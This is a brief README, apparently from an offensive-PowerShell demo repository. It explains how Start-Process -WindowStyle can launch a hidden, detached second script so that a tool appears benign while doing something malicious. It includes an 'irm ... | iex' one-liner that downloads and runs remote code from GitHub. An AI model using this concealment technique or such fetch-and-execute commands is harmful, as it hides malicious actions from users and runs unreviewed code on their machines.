This method uses the -WindowStyle option on Start-Process to run a second script completely hidden and detatched from the first one. The first script can do what is advertised, while the second script does something malicious.

If you want to see an example in action, you can run the included script, **after** looking at it to see what it does

```PowerShell
irm https://raw.githubusercontent.com/starchyunderscore/offensive-ps/main/method-1/run.ps1 | iex
```
